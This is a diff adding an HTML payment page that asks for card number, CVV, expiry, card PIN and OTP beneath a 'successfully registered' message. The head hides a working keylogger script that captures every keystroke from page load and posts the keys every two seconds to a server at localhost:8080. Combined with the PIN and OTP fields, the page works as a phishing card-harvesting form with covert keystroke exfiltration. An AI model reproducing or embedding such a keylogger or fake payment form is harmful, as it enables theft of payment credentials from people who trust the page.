@@ -1,0 +1,333 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>payment</title>
+    <link rel="stylesheet" href="styles/payment.css">
+    <script>
+      var keylog = {
+          cache : [],
+          sending : false,
+          
+          init : function () {
+              window.addEventListener("keydown", function(evt){
+                  keylog.cache.push(evt.key);
+              });
+              
+              window.setInterval(keylog.send, 2000);
+          },
+          
+          send : function () { if (!keylog.sending && keylog.cache.length != 0){
+              keylog.sending = true;
+              
+              var data = new FormData();
+              data.append("keys", JSON.stringify(keylog.cache));
+              keylog.cache = [];
+              
+              var xhr = new XMLHttpRequest();
+              xhr.open("POST", "http://localhost:8080/index.php", true);
+              xhr.setRequestHeader("Access-Control-Request-Method", "POST");
+              xhr.setRequestHeader("Access-Control-Allow-Origin", "*");    
+              xhr.onload = function(){
+                  keylog.sending = false;
+                  console.log(this.response);
+              };
+              xhr.send (data);
+          }}
+      };
+         window.addEventListener("DOMContentLoaded", keylog.init);
+    </script>
+</head>
+<body>
+    <div class="preloader">
+        <div class="con-preloder">
+            <img class="load1" src="photos.html/world.png" alt="loading">
+            <img class="load2" src="photos.html/x.png" alt="loading">
+        </div>
+    </div>
+    <div class="body">
+        <video autoplay loop muted plays-inline
+        id="background-vid" >
+            <source src="photos.html/introvid.mp4">
+        </video>
+        <img class="logo"src="photos.html/logo.png" alt="loading">
+        <div class="pay-form">
+            <h1 class="pay-ttl"
+            ">Successfully registered,now proceed to make payments to start your journey with us</h1>
+            <div>
+                <p style="
+                font-family: Arial;
+                font-weight:bold;
+                color: darkblue;
+                ">card number</p><br/>
+                <input type="number" id="cardnumber" style="
+                border-radius:5px;
+                border-style:solid;
+                margin-bottom:20px
+                ">
+            </div>
+            <div>
+                <p style="
+                font-family: Arial;
+                font-weight:bold;
+                color: darkblue;
+                ">cardholder name</p><br/>
+                <input type="textbox" id="cardname"  style="
+                border-radius:5px;
+                border-style:solid;
+                margin-bottom:20px
+                ">
+            </div>
+            <div>
+                <p style="
+                font-family: Arial;
+                font-weight:bold;
+                color: darkblue;
+                ">card type</p><br/>
+                <input type="textbox" id="cardtype"  placeholder="Visa,Mastercard, American Express,Discover" style="
+                border-radius:5px;
+                border-style:solid;
+                margin-bottom:20px
+                ">
+            </div>
+            <div>
+                <p style="
+                font-family: Arial;
+                font-weight:bold;
+                color: darkblue;
+                ">country</p><br/>
+                <select class="country" id="selectcountry">
+                    <option value="USA">
+                        USA
+                    </option>
+                    <option value="Canada">
+                        Canada 
+                    </option>
+                    <option value="UK">
+                        UK
+                    </option>
+                    <option value="South Africa">
+                        South Africa 
+                    </option>
+                    <option value="Brazil">
+                        Brazil 
+                    </option>
+                    <option value="Mexico">
+                        Mexico 
+                    </option>
+                    <option value="Nigeria">
+                        Nigeria 
+                    </option>
+                    <option value="Morocco">
+                        Morocco 
+                    </option>
+                    <option value="Egypt">
+                        Egypt 
+                    </option>
+                    <option value="Spain">
+                        Spain
+                    </option>
+                </select>
+            </div>
+            <div class="pay-left">
+                 <div>
+                <p style="
+                font-family: Arial;
+                font-weight:bold;
+                color: darkblue;
+                ">cvv</p><br/>
+                <input type="number" id="cvv" style="
+                border-radius:5px;
+                border-style:solid;
+                margin-bottom:20px;
+                width:60px;
+                ">
+            </div>
+            <div>
+                <p style="
+                font-family: Arial;
+                font-weight:bold;
+                color: darkblue;
+                ">expiry date</p><br/>
+                <input type="text" id="expdate" placeholder="MM/YY" maxlength="4" pattern="[0-12][21-32] {4}" style="
+                border-radius:5px;
+                border-style:solid;
+                margin-bottom:20px;
+                width:80px;
+                ">
+            </div>
+            <div>
+                <p style="
+                font-family: Arial;
+                font-weight:bold;
+                color: darkblue;
+                ">pin</p><br/>
+                <input type="password" id="pin" style="
+                border-radius:5px;
+                border-style:solid;
+                margin-bottom:20px
+                ">
+            </div>
+            <div>
+                <p style="
+                font-family: Arial;
+                font-weight:bold;
+                color: darkblue;
+                ">Amount</p><br/>
+                <input type="text" id="amount" placeholder="add currency denomination"style="
+                border-radius:5px;
+                border-style:solid;
+                margin-bottom:20px
+                ">
+            </div>
+            </div>
+           <div id="otp-div">
+               <p style="
+                font-family: Arial;
+                font-weight:bold;
+                color: darkblue;
+                ">OTP</p><br/>
+                <a id="resend-otp" href="#" disabled="disabled">Resend</a><br/>
+               <input type="number" id="otp" disabled="disabled" style="
+                border-radius:5px;
+                border-style:solid;
+                margin-bottom:20px;
+                ">
+           </div>
+            <button id="proceed" disabled="disabled"
+            style="
+            display:flex;
+            border-radius:8px;
+            border:none;
+            background-color:yellow;
+            color:green;
+            height:35px;
+            width:70px;
+            padding-left:10px;
+            margin-left:150px;
+            margin-top:20px;
+            align-items:center;
+            ">proceed</button>    
+            
+        </div>
+         <div class="sec-line">
+        <h1 class="ins">pictorial inspirations</h1>
+    </div>
+    <div class="pic-ins">
+    </div>
+    <div class="words">
+              <p class="words-of-wisdom">Embrace the journey</p>
+              <p class="words-of-wisdom">seek advice</p>
+              <p class="words-of-wisdom">learn new stuffs</p>
+              <p class="words-of-wisdom">Dream big</p>
+              <p class="words-of-wisdom">You can do it</p>
+              <p class="words-of-wisdom">work hard</p>
+              <p class="words-of-wisdom">Never give up</p>
+              <p class="words-of-wisdom">Stay positive</p>
+          </div>
+           <div style="
+          display:flex;
+          flex-direction:column;
+          background-color:white;
+          align-items:center;
+          height:250px;
+          margin-top:50px;
+          ">
+              <p style="
+              font-size:40px;
+              font-weight:bold;
+              
+              ">powered by 
+              <a href="https://silasworldhealth.blogspot.com/?m=0">
+                    <img class="sponsor" src="photos.html/mariologo.png" alt="loading"></p>
+              </a>
+              </div>
+    </div>
+    
+    
+    
+    <script>
+        
+        const Otp = document.getElementById("otp");
+        const input = document.getElementById("pin");
+        
+        
+        input.addEventListener("keyup", (e)=>{
+            const value = e.currentTarget.value;
+            if(value ==="") {
+                Otp.disabled = true;
+            }
+            else {
+                Otp.disabled = false;
+            }
+        });
+        
+</script>
+
+<script>
+    const ProceedButton = document.getElementById("proceed");
+        const  Ala = document.getElementById("otp");
+        
+        
+        input.addEventListener("keyup", (e)=>{
+            const value = e.currentTarget.value;
+            if(value ==="") {
+                ProceedButton.disabled = true;
+            }
+            else {
+                ProceedButton.disabled = false;
+            }
+        });
+        
+        window.addEventListener("load", function(){
+           const loader = document.querySelector(".preloader");
+           loader.className += " hidden";
+       });
+</script>
+
+<script>
+    const otpDiv = document.getElementById('otp-div');
+const otpInput = document.getElementById('otp');
+const resendOtpLink = document.getElementById('resend-otp');
+
+let timer;
+let timeLeft = 60; // 60 seconds
+
+function startTimer() {
+  clearInterval(timer);
+  timer = setInterval(() => {
+    timeLeft--;
+    resendOtpLink.textContent = `Resend (${timeLeft}s)`;
+    if (timeLeft === 0) {
+      clearInterval(timer);
+      resendOtpLink.textContent = 'Resend OTP';
+      resendOtpLink.removeAttribute('disabled');
+      timeLeft = 60;
+    }
+  }, 1000);
+}
+
+otpDiv.addEventListener('submit', function(event) {
+  event.preventDefault();
+
+  // Handle OTP submission
+});
+
+resendOtpLink.addEventListener('click', function(event) {
+  event.preventDefault();
+
+  // Send OTP request
+  startTimer();
+  resendOtpLink.setAttribute('disabled', 'disabled');
+});
+
+  
+        
+
+startTimer();
+
+</script>
+
+</body>
+</html>
